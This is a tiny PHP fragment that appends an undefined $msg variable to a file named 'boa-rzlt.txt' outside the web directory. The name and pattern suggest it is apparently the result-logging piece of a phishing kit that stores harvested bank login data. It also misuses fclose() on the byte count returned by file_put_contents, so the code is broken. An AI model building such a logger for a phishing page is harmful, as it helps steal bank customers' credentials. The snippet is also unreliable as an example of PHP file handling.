<?php
$myfile = file_put_contents('../boa-rzlt.txt', $msg .PHP_EOL , FILE_APPEND | LOCK_EX);
fclose($myfile);


?>